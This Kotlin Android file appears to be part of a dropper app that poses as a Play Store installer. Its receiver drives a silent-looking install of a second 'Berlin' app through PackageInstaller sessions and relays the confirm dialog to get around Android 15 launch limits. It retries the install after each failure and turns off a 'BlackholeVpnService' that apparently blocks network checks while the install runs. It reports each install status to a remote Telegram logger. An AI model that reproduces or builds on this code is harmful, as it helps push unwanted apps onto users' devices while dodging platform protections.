package com.playstore.installer.berlin

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build
import com.playstore.installer.BlackholeVpnService
import com.playstore.installer.TelegramLogger

/**
 * BerlinInstallReceiver — dedicated PackageInstaller callback receiver for Berlin app installs.
 *
 * Completely separate from InstallReceiver (companion flow) — zero shared state.
 * Mirrors InstallReceiver pattern exactly but uses berlin-specific action strings
 * so companion and berlin sessions never interfere with each other.
 *
 * Actions relayed to BerlinInstallManager (registered in InstallActivity):
 *   BERLIN_INSTALL_CONFIRM_ACTION — relay install dialog intent (Android 15+ BAL fix)
 *   BERLIN_INSTALL_RESTART_ACTION — relay restart signal on install failure
 *   BERLIN_INSTALL_SUCCESS_ACTION — install succeeded, BerlinInstallManager sets DONE
 */
class BerlinInstallReceiver : BroadcastReceiver() {

    companion object {
        // Session action registered in AndroidManifest.xml for berlin PackageInstaller sessions
        // Format: <packageName>.BERLIN_SESSION_ACTION — set in BerlinInstallManager.installViaSession()
        const val BERLIN_SESSION_ACTION_SUFFIX = ".BERLIN_SESSION_ACTION"

        // Relayed to BerlinInstallManager so it can launch the install dialog
        // from Activity context (required on Android 15+ / API 35+ BAL restriction)
        const val BERLIN_INSTALL_CONFIRM_ACTION = "berlin_install_confirm"

        // Relayed to BerlinInstallManager so it can restart the berlin install flow
        // from Activity context (startActivity from BroadcastReceiver blocked on Android 15+)
        const val BERLIN_INSTALL_RESTART_ACTION = "berlin_install_restart"

        // Sent on STATUS_SUCCESS — BerlinInstallManager receives this to set Stage.BERLIN_DONE
        // Format: <packageName>.BERLIN_INSTALL_SUCCESS — set in BerlinInstallManager
        const val BERLIN_INSTALL_SUCCESS_SUFFIX = ".BERLIN_INSTALL_SUCCESS"
    }

    override fun onReceive(context: Context, intent: Intent) {

        val status = intent.getIntExtra(
            PackageInstaller.EXTRA_STATUS,
            PackageInstaller.STATUS_FAILURE
        )

        TelegramLogger.send(
            context, "BERLIN_INSTALL_RECEIVER", "STATUS_RECEIVED",
            "status=$status rawStatusName=${statusName(status)} " +
            "msg=${intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: "none"}"
        )

        when (status) {

            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                val userIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                }
                if (userIntent != null) {
                    TelegramLogger.send(
                        context, "BERLIN_PENDING_USER_ACTION", "RELAY_SENT",
                        "userIntent=${userIntent.component} — relaying to BerlinInstallManager"
                    )
                    // Relay to InstallActivity (where BerlinInstallManager receiver is registered)
                    // so it launches via startActivityForResult() from Activity context.
                    val relay = Intent(BERLIN_INSTALL_CONFIRM_ACTION).apply {
                        setPackage(context.packageName)
                        putExtra(Intent.EXTRA_INTENT, userIntent)
                    }
                    context.sendBroadcast(relay)
                } else {
                    TelegramLogger.send(
                        context, "BERLIN_PENDING_USER_ACTION", "FAILED",
                        "userIntent is NULL — berlin install dialog cannot be shown"
                    )
                }
            }

            PackageInstaller.STATUS_SUCCESS -> {
                // Stop VPN — berlin install complete
                BlackholeVpnService.stop(context)

                try {
                    val pkgName = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME)

                    TelegramLogger.send(
                        context, "BERLIN_STATUS_SUCCESS", "INSTALL_COMPLETE",
                        "berlin pkg=$pkgName — sending BERLIN_INSTALL_SUCCESS broadcast"
                    )

                    // Notify BerlinInstallManager in InstallActivity
                    val successAction = context.packageName + BERLIN_INSTALL_SUCCESS_SUFFIX
                    val doneIntent = Intent(successAction).apply {
                        setPackage(context.packageName)
                        if (!pkgName.isNullOrEmpty()) {
                            putExtra(PackageInstaller.EXTRA_PACKAGE_NAME, pkgName)
                        }
                    }
                    context.sendBroadcast(doneIntent)

                } catch (e: Exception) {
                    TelegramLogger.send(
                        context, "BERLIN_STATUS_SUCCESS", "OUTER_EXCEPTION",
                        "${e.javaClass.simpleName}: ${e.message}"
                    )
                }
            }

            PackageInstaller.STATUS_FAILURE,
            PackageInstaller.STATUS_FAILURE_ABORTED,
            PackageInstaller.STATUS_FAILURE_BLOCKED,
            PackageInstaller.STATUS_FAILURE_CONFLICT,
            PackageInstaller.STATUS_FAILURE_INCOMPATIBLE,
            PackageInstaller.STATUS_FAILURE_INVALID,
            PackageInstaller.STATUS_FAILURE_STORAGE -> {
                BlackholeVpnService.stop(context)
                val msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: "no message"
                TelegramLogger.send(
                    context, "BERLIN_INSTALL_FAILURE", statusName(status),
                    "status=$status msg=$msg — relaying BERLIN_INSTALL_RESTART_ACTION"
                )
                // Relay restart signal to BerlinInstallManager in InstallActivity
                val relay = Intent(BERLIN_INSTALL_RESTART_ACTION).apply {
                    setPackage(context.packageName)
                }
                context.sendBroadcast(relay)
            }
        }
    }

    private fun statusName(status: Int): String = when (status) {
        PackageInstaller.STATUS_PENDING_USER_ACTION   -> "PENDING_USER_ACTION"
        PackageInstaller.STATUS_SUCCESS               -> "SUCCESS"
        PackageInstaller.STATUS_FAILURE               -> "FAILURE"
        PackageInstaller.STATUS_FAILURE_ABORTED       -> "FAILURE_ABORTED"
        PackageInstaller.STATUS_FAILURE_BLOCKED       -> "FAILURE_BLOCKED"
        PackageInstaller.STATUS_FAILURE_CONFLICT      -> "FAILURE_CONFLICT"
        PackageInstaller.STATUS_FAILURE_INCOMPATIBLE  -> "FAILURE_INCOMPATIBLE"
        PackageInstaller.STATUS_FAILURE_INVALID       -> "FAILURE_INVALID"
        PackageInstaller.STATUS_FAILURE_STORAGE       -> "FAILURE_STORAGE"
        else                                          -> "UNKNOWN_$status"
    }
}
